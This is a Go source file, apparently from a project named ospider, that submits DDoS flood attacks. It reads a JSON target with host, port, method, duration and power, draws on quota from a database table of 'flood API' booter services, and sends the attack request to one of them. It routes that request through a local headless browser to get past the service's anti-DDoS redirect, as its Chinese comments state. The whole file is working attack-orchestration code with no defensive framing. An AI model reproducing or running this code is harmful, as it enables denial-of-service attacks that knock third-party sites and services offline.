package attack

import (
	"github.com/huzorro/ospider/common"
	"github.com/huzorro/ospider/web/handler" 
    "github.com/huzorro/ospider/util"
	"encoding/json"
    "sync"
    "net/url"
    "fmt"
    "github.com/PuerkitoBio/goquery"
    "encoding/binary"
)

type AttackSubmit struct {
    lock *sync.Mutex
    cfg common.Ospider                
}
func NewAttackSubmit(co common.Ospider) *AttackSubmit {
    return &AttackSubmit{cfg:co, lock:new(sync.Mutex)}
}

func (self *AttackSubmit) Process(payload string) {
    var (
        attack handler.FloodTarget
        api handler.FloodApi
        powerlevel uint32
        newPowerlevel uint32
        time uint32
        newTime uint32
    )
    self.cfg.Log.Println("attack submit...")
    if err := json.Unmarshal([]byte(payload), &attack); err != nil {
        self.cfg.Log.Printf("json Unmarshal fails %s", err)
        return
    }
    self.lock.Lock()
    defer self.lock.Unlock()
    // sqlStr := `select id, name, api, powerlevel, time 
    //             from spider_flood_api where uptime < unix_timestamp()  
    //             and time > 0 and powerlevel > 0 and status = 1`
    sqlStr := `select id, name, api, powerlevel, time 
                from spider_flood_api where uptime < unix_timestamp()  
                and status = 1`                
    stmtOut, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtOut.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        // self.lock.Unlock()
        return
    }  
    
     
    rows, err := stmtOut.Query()
    defer rows.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        // self.lock.Unlock()
        return        
    }
    for rows.Next() {
        err = rows.Scan(&api.Id, &api.Name, &api.Api, &api.Powerlevel, &api.Time)
        if err != nil {
            self.cfg.Log.Printf("rows.Scan (%s) fails %s", sqlStr, err)
            // self.lock.Unlock()
            return             
        }
        var powerlevelBuf = make([]byte, 8)
        binary.BigEndian.PutUint64(powerlevelBuf, uint64(api.Powerlevel))
        powerlevel = binary.BigEndian.Uint32(powerlevelBuf[:4])
        newPowerlevel = binary.BigEndian.Uint32(powerlevelBuf[4:])
        
        var timeBuf = make([]byte, 8)
        binary.BigEndian.PutUint64(timeBuf, uint64(api.Time))
        time = binary.BigEndian.Uint32(timeBuf[:4])
        newTime = binary.BigEndian.Uint32(timeBuf[4:])
         
        if newPowerlevel > 0 && newTime > 0 {                        
             break;
        } 
    }
    self.cfg.Log.Printf("powerlevel:%d-%d time:%d-%d", powerlevel, newPowerlevel, time, newTime)    
    if newPowerlevel <= 0 || newTime <= 0 {
        // self.lock.Unlock()
        self.cfg.Log.Printf("powerlevel or time run out")
        return
    }
    
    sqlStr = `update spider_flood_api set time = ?, powerlevel = ? , uptime = unix_timestamp() + ? where id = ?`
    
    stmtIn, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtIn.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        // self.lock.Unlock()
        return
    } 
    var powerlevelBuf = make([]byte, 8)
    binary.BigEndian.PutUint32(powerlevelBuf[:4], powerlevel)
    binary.BigEndian.PutUint32(powerlevelBuf[4:], newPowerlevel - uint32(attack.Powerlevel)) 
    
    
    var timeBuf = make([]byte, 8)
    binary.BigEndian.PutUint32(timeBuf[:4], time)
    binary.BigEndian.PutUint32(timeBuf[4:], newTime - uint32(attack.Time))
    
    self.cfg.Log.Printf("powerlevel:%d-%d-%d time:%d-%d-%d", powerlevel, newPowerlevel, attack.Powerlevel, time, newTime,attack.Time)    
    _, err = stmtIn.Exec(binary.BigEndian.Uint64(timeBuf), binary.BigEndian.Uint64(powerlevelBuf), attack.Time, api.Id)
    
    if err != nil {
        self.cfg.Log.Printf("update flood api fails %s", err)
        // self.lock.Unlock()
        return
    } 
    // self.lock.Unlock()    
    //attack submit
    u, _ :=  url.ParseRequestURI(api.Api)
    query := u.Query()
    // ips, err := net.LookupIP(attack.Url)
    // if  err == nil {
    //     attack.Host = ips[0].String()
    // }
    self.cfg.Log.Println("lookup host start...")
    ip, err := util.LookupHost(attack.Url)
    self.cfg.Log.Println("lookup host end...")
    if err != nil {
        self.cfg.Log.Println("lookup host fails")        
    } else {
        attack.Host = ip
    }
    query.Add("host", attack.Host)
    query.Add("method", attack.Method)
    query.Add("time", fmt.Sprintf("%d", attack.Time))
    query.Add("port", attack.Port)
    query.Add("powerlevel", fmt.Sprintf("%d", attack.Powerlevel))
    u.RawQuery = query.Encode()
    
    self.cfg.Log.Println(u.String()) 
    self.cfg.Log.Println("attack request start...")
    // response, err := util.HttpGet(u.String())
    //目标api为了防止ddos采用了302跳转然后自动刷新到目标api的方法
    //采用headless浏览器渲染目标api
    postValues := url.Values{}
    postValues.Add("url", u.String())
    postValues.Add("renderTime", "30")
    postValues.Add("script", "setTimeout(function() { console.log(document);},10000)")    
    response, err := util.HttpPost("http://localhost:10010/doload", postValues)
    
    self.cfg.Log.Println("attack request end...")
    defer func() {
        if response != nil {
            response.Body.Close()
        }
    }()
    if err != nil || response == nil {
        self.cfg.Log.Printf("request fails {%s}", u.String())
        return        
    }
    self.cfg.Log.Println("attack response read start...")    
    doc, _ := goquery.NewDocumentFromResponse(response)
    
    self.cfg.Log.Printf("{%s} {%s}", u.String(), doc.Text())
    self.cfg.Log.Println("attack response read end...")
    // sqlStr = `update spider_flood_api set time = ?, powerlevel = ? , uptime = unix_timestamp() + ? where id = ?`
    
    // stmtIn, err := self.cfg.Db.Prepare(sqlStr)
    // defer stmtIn.Close()
    // if err != nil {
    //     self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
    //     return
    // } 
    // var powerlevelBuf = make([]byte, 8)
    // binary.BigEndian.PutUint32(powerlevelBuf[:4], powerlevel)
    // binary.BigEndian.PutUint32(powerlevelBuf[4:], newPowerlevel - uint32(attack.Powerlevel)) 
    
    
    // var timeBuf = make([]byte, 8)
    // binary.BigEndian.PutUint32(timeBuf[:4], time)
    // binary.BigEndian.PutUint32(timeBuf[4:], newTime - uint32(attack.Time))

    // self.cfg.Log.Printf("powerlevel:%d-%d-%d time:%d-%d-%d", powerlevel, newPowerlevel, attack.Powerlevel, time, newTime,attack.Time)    
    // _, err = stmtIn.Exec(binary.BigEndian.Uint64(timeBuf), binary.BigEndian.Uint64(powerlevelBuf), attack.Time, api.Id)
    
    // if err != nil {
    //     self.cfg.Log.Printf("update flood api fails %s", err)
    //     return
    // } 
                     
}
